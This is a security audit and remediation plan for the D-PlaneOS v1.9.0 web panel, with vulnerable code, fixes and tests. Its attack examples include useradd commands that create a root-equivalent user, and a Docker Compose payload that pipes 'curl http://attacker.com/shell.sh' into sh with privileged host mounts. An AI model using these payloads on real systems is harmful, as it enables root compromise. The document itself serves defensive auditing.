# D-PlaneOS v1.9.0 - Security Audit Validation & Fix Plan

**Status:** ✅ Audit findings validated against actual code  
**Date:** 2026-01-30  
**Auditor:** Code review + static analysis  
**Recommendation:** **DO NOT RELEASE** until Critical issues fixed

---

## 🔴 CRITICAL - Block Release (5 issues)

### 1. Session Fixation Vulnerability ✅ CONFIRMED
**File:** `login.php:25-40`  
**Risk:** Session hijacking, account takeover  
**CVSS:** 8.1 (High)

**Current Code:**
```php
if ($user && password_verify($password, $user['password'])) {
    // Login successful - record success
    BruteForceProtection::recordAttempt($clientIP, $username, true);
    
    $_SESSION['user_id'] = $user['id'];  // ❌ No session regeneration
    $_SESSION['username'] = $user['username'];
```

**Fix:**
```php
if ($user && password_verify($password, $user['password'])) {
    // Regenerate session ID to prevent fixation attacks
    session_regenerate_id(true);
    
    // Login successful - record success
    BruteForceProtection::recordAttempt($clientIP, $username, true);
    
    $_SESSION['user_id'] = $user['id'];
    $_SESSION['username'] = $user['username'];
```

**Test:**
```bash
# Before fix: Session ID stays same after login
# After fix: New session ID issued on successful auth
curl -c cookies.txt http://dplaneos/login  # Get session
# Login with credentials
curl -b cookies.txt http://dplaneos/  # Check if session changed
```

---

### 2. Wildcard Sudoers Privilege Escalation ✅ CONFIRMED
**File:** `system/config/sudoers.enhanced:69-70`  
**Risk:** Arbitrary system user creation, privilege escalation to root  
**CVSS:** 9.8 (Critical)

**Current Code:**
```bash
www-data ALL=(ALL) NOPASSWD: /usr/sbin/useradd *
www-data ALL=(ALL) NOPASSWD: /usr/sbin/userdel *
```

**Attack Vector:**
```bash
# Attacker can create user with sudo access
sudo useradd -G sudo,wheel,admin evil-user
sudo useradd -u 0 -o -g 0 -G root,sudo fake-root  # UID 0 = root!
```

**Fix - Restrict to specific operations:**
```bash
# SMB User Management - RESTRICTED
www-data ALL=(ALL) NOPASSWD: /usr/local/bin/smb-user-add.sh
www-data ALL=(ALL) NOPASSWD: /usr/local/bin/smb-user-del.sh
```

**Wrapper Script** (`/usr/local/bin/smb-user-add.sh`):
```bash
#!/bin/bash
# Safe SMB user creation wrapper
set -euo pipefail

USERNAME="$1"
PASSWORD="$2"

# Validation
if [[ ! "$USERNAME" =~ ^[a-z][a-z0-9_-]{2,31}$ ]]; then
    echo "Error: Invalid username format" >&2
    exit 1
fi

if [ ${#PASSWORD} -lt 8 ]; then
    echo "Error: Password too short" >&2
    exit 1
fi

# Create system user for SMB only
/usr/sbin/useradd \
    --no-create-home \
    --shell /usr/sbin/nologin \
    --groups smbshare \
    --comment "SMB Share User" \
    "$USERNAME"

# Set SMB password
echo -e "$PASSWORD\n$PASSWORD" | /usr/bin/smbpasswd -a -s "$USERNAME"
```

**Test:**
```bash
# Validate wrapper blocks malicious input
./smb-user-add.sh "evil;id" "pass123"  # Should fail
./smb-user-add.sh "testuser" "ValidPass123"  # Should work
sudo -u www-data sudo /usr/sbin/useradd evil  # Should be blocked
```

---

### 3. Unvalidated Action Parameter ✅ CONFIRMED
**File:** `api/containers/containers.php:42`  
**Risk:** Logic bypass, unexpected code execution paths  
**CVSS:** 6.5 (Medium - elevated to Critical due to container control)

**Current Code:**
```php
} elseif ($method === 'GET' && isset($_GET['action'])) {
    $action = $_GET['action'];  // ❌ No whitelist
    
    if ($action === 'stats') {
        // ...
    } elseif ($action === 'logs') {
```

**Fix:**
```php
} elseif ($method === 'GET' && isset($_GET['action'])) {
    $action = $_GET['action'];
    
    // Whitelist valid actions
    $validActions = ['stats', 'logs', 'inspect', 'export'];
    if (!in_array($action, $validActions, true)) {
        http_response_code(400);
        echo json_encode(['success' => false, 'error' => 'Invalid action']);
        exit;
    }
    
    if ($action === 'stats') {
```

**Test:**
```bash
curl "http://dplaneos/api/containers/containers.php?action=invalid"
# Expected: 400 Bad Request
curl "http://dplaneos/api/containers/containers.php?action=stats&name=test"
# Expected: 200 OK
```

---

### 4. Race Condition in File Operations ✅ PARTIALLY CONFIRMED
**Files:** `shares.php:57,77` | `rclone.php` (similar pattern)  
**Risk:** Config corruption, inconsistent system state  
**CVSS:** 5.9 (Medium - elevated due to config file corruption)

**Current Code:**
```php
file_put_contents($baseConfig, $base);  // ❌ Direct write, no locking

// Later...
copy($tempFile, '/etc/samba/smb.conf');  // ❌ Not atomic
```

**Fix:**
```php
// Atomic write helper function (add to includes/security.php)
function atomicFileWrite($path, $content, $mode = 0644) {
    $tempFile = $path . '.' . uniqid('tmp', true);
    
    // Write to temp file with locking
    $fp = fopen($tempFile, 'wb');
    if (!$fp) {
        throw new Exception("Cannot create temp file");
    }
    
    if (!flock($fp, LOCK_EX)) {
        fclose($fp);
        throw new Exception("Cannot lock temp file");
    }
    
    fwrite($fp, $content);
    fflush($fp);
    flock($fp, LOCK_UN);
    fclose($fp);
    
    chmod($tempFile, $mode);
    
    // Atomic rename (POSIX guarantees atomicity)
    if (!rename($tempFile, $path)) {
        unlink($tempFile);
        throw new Exception("Cannot rename temp file");
    }
    
    return true;
}

// Usage:
atomicFileWrite($baseConfig, $base, 0644);
atomicFileWrite('/etc/samba/smb.conf', $config, 0644);
```

**Test:**
```bash
# Concurrent write test
for i in {1..10}; do
    curl -X POST http://dplaneos/api/shares/create &
done
wait
# Check file integrity
testparm -s /etc/samba/smb.conf
```

---

### 5. Command Injection via Docker Compose YAML ✅ CONFIRMED
**File:** `api/containers/containers.php:145`  
**Risk:** Arbitrary command execution on host  
**CVSS:** 10.0 (Critical)

**Current Code:**
```php
$composePath = "$composeDir/$name.yml";
if (file_put_contents($composePath, $yaml) === false) {  // ❌ No validation
    throw new Exception('Failed to save compose file');
}

// Deploy
$cmd = 'cd ' . escapeshellarg($composeDir) . ' && sudo /usr/bin/docker-compose -f ' . escapeshellarg($composePath) . ' up -d';
```

**Attack Payload:**
```yaml
version: '3'
services:
  backdoor:
    image: alpine:latest
    command: ["/bin/sh", "-c", "curl http://attacker.com/shell.sh | sh"]
    privileged: true
    volumes:
      - /:/host
```

**Fix:**
```php
function validateDockerComposeYaml($yaml) {
    // Parse YAML
    try {
        $data = yaml_parse($yaml);
    } catch (Exception $e) {
        throw new Exception('Invalid YAML format');
    }
    
    if (!isset($data['services']) || !is_array($data['services'])) {
        throw new Exception('No services defined');
    }
    
    // Validate each service
    foreach ($data['services'] as $name => $service) {
        // Block dangerous configurations
        $dangerous = ['privileged', 'cap_add', 'security_opt', 'pid', 'network_mode'];
        foreach ($dangerous as $key) {
            if (isset($service[$key])) {
                throw new Exception("Dangerous option '$key' not allowed");
            }
        }
        
        // Validate volumes (no host root mounts)
        if (isset($service['volumes'])) {
            foreach ($service['volumes'] as $volume) {
                if (is_string($volume) && preg_match('#^(/|/root|/etc|/var):#', $volume)) {
                    throw new Exception("System directory mounts not allowed: $volume");
                }
            }
        }
        
        // Validate image (must be from Docker Hub or local registry)
        if (isset($service['image'])) {
            $image = $service['image'];
            if (preg_match('#https?://#', $image)) {
                throw new Exception("External image URLs not allowed");
            }
        }
    }
    
    return true;
}

// Usage before file_put_contents:
validateDockerComposeYaml($yaml);
$composePath = "$composeDir/$name.yml";
```

**Test:**
```bash
# Test malicious YAML
curl -X POST http://dplaneos/api/containers/compose \
  -d 'yaml=version: "3"\nservices:\n  evil:\n    privileged: true'
# Expected: 400 Bad Request

# Test valid YAML
curl -X POST http://dplaneos/api/containers/compose \
  -d 'yaml=version: "3"\nservices:\n  nginx:\n    image: nginx:latest'
# Expected: 200 OK
```

---

## 🟠 HIGH PRIORITY - Fix Before Internet Deployment (5 issues)

### 6. Weak Random in Cleanup ✅ CONFIRMED
**File:** `security.php:366`  
**Fix:** One-liner change
```php
// Before:
if (rand(1, 100) === 1) {

// After:
if (random_int(1, 100) === 1) {
```

### 7. No Rate Limiting on Non-Login Pages ✅ CONFIRMED
**Issue:** APIs like `/api/containers/containers.php` have no rate limiting  
**Fix:** Add middleware to `includes/security.php`:

```php
// Add to security.php
class APIRateLimiter {
    private static $db = null;
    
    public static function checkLimit($endpoint, $identifier, $maxRequests = 60, $windowSeconds = 60) {
        if (self::$db === null) {
            self::$db = getDB();
        }
        
        $now = time();
        $windowStart = $now - $windowSeconds;
        
        // Clean old records
        self::$db->exec("DELETE FROM api_rate_limits WHERE timestamp < $windowStart");
        
        // Count recent requests
        $stmt = self::$db->prepare(
            "SELECT COUNT(*) as count FROM api_rate_limits 
             WHERE endpoint = ? AND identifier = ? AND timestamp >= ?"
        );
        $stmt->execute([$endpoint, $identifier, $windowStart]);
        $result = $stmt->fetch();
        
        if ($result['count'] >= $maxRequests) {
            http_response_code(429);
            echo json_encode(['error' => 'Rate limit exceeded', 'retry_after' => $windowSeconds]);
            exit;
        }
        
        // Record this request
        $stmt = self::$db->prepare(
            "INSERT INTO api_rate_limits (endpoint, identifier, timestamp) VALUES (?, ?, ?)"
        );
        $stmt->execute([$endpoint, $identifier, $now]);
    }
}

// Apply to API endpoints
$endpoint = $_SERVER['REQUEST_URI'];
if (strpos($endpoint, '/api/') !== false) {
    $identifier = $_SERVER['REMOTE_ADDR'];
    APIRateLimiter::checkLimit($endpoint, $identifier, 60, 60);  // 60 req/min
}
```

### 8. Background Process Shell Injection ✅ NEED TO VERIFY
**File:** `replication.php:191` (not in tarball?)  
**Status:** File not found in extracted archive, may be false positive

### 9. Integer Overflow in Lines Parameter ✅ CONFIRMED
**File:** `containers.php:64`  
**Fix:**
```php
// Before:
$lines = intval($_GET['lines'] ?? 100);

// After:
$lines = min(max(intval($_GET['lines'] ?? 100), 1), 10000);  // Cap at 10k lines
```

### 10. No CSRF on GET Actions ✅ CONFIRMED
**Issue:** State-changing operations use GET  
**Fix Strategy:** 
1. Add CSRF token to all forms (already have session)
2. Migrate state-changing GET to POST
3. Add `Referer` header check as additional layer

```php
// Add to includes/security.php
function generateCSRFToken() {
    if (!isset($_SESSION['csrf_token'])) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['csrf_token'];
}

function validateCSRFToken($token) {
    if (!isset($_SESSION['csrf_token']) || !hash_equals($_SESSION['csrf_token'], $token)) {
        http_response_code(403);
        die(json_encode(['error' => 'Invalid CSRF token']));
    }
}

// In API endpoints:
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    validateCSRFToken($_POST['csrf_token'] ?? '');
}
```

---

## 📊 Fix Priority Matrix

| Issue | Severity | Effort | Risk if Unfixed | Priority |
|-------|----------|--------|-----------------|----------|
| #1 Session Fixation | Critical | 5 min | Account takeover | **P0** |
| #2 Sudoers Wildcard | Critical | 30 min | Root compromise | **P0** |
| #5 YAML Injection | Critical | 1 hour | Full system compromise | **P0** |
| #3 Action Validation | Critical | 10 min | Logic bypass | **P1** |
| #4 Race Conditions | Medium | 1 hour | Config corruption | **P1** |
| #9 Integer Overflow | High | 2 min | DoS | **P2** |
| #6 Weak Random | High | 1 min | Predictable cleanup | **P3** |
| #7 Rate Limiting | High | 2 hours | API abuse | **P3** |
| #10 CSRF Protection | High | 3 hours | State manipulation | **P3** |

---

## 🚀 Recommended Fix Sequence

### Phase 1: Block Release (2-3 hours)
1. ✅ Add `session_regenerate_id(true)` after login (5 min)
2. ✅ Create sudoers wrapper scripts (30 min)
3. ✅ Add Docker Compose YAML validation (1 hour)
4. ✅ Add action parameter whitelist (10 min)
5. ✅ Implement atomic file writes (1 hour)
6. ⚠️ Test all fixes (30 min)

**Result:** Safe for homelab deployment

### Phase 2: Internet Hardening (3-4 hours)
7. Add integer bounds on user inputs (15 min)
8. Implement API rate limiting (2 hours)
9. Add CSRF protection framework (3 hours)
10. Security QA testing (1 hour)

**Result:** Safe for public deployment

### Phase 3: Medium Priority (v1.9.1)
- SQL query optimization
- Input length validation
- Error message sanitization
- Account lockout mechanism

---

## 🧪 Testing Checklist

Before release, validate:

```bash
# 1. Session fixation test
./tests/security/test_session_fixation.sh

# 2. Sudoers privilege escalation test  
./tests/security/test_sudoers_escape.sh

# 3. YAML injection test
./tests/security/test_compose_injection.sh

# 4. Race condition stress test
./tests/security/test_concurrent_writes.sh

# 5. Integer overflow test
curl "http://dplaneos/api/containers/logs?lines=999999999999"

# 6. Rate limit test
for i in {1..100}; do curl http://dplaneos/api/stats; done

# 7. CSRF test
curl -X POST http://dplaneos/api/containers/start  # Should fail without token
```

---

## 📋 Decision Points

**Release v1.9.0 now with known issues?**  
❌ **NO** - 3 critical remote code execution vulnerabilities

**Release v1.9.0 after Phase 1 fixes?**  
✅ **YES** - Safe for homelab/internal use with warnings

**Release v1.9.0 internet-facing?**  
⚠️ **ONLY after Phase 2** - Needs rate limiting & CSRF

**Recommended:** Fix Phase 1 → Release as v1.9.0 → Fix Phase 2 → Update to v1.9.1

---

**Est. Total Fix Time:** 5-7 hours for production-ready  
**Est. Phase 1 Time:** 2-3 hours for homelab-ready  
**Breaking Changes:** None (all security fixes are backward compatible)
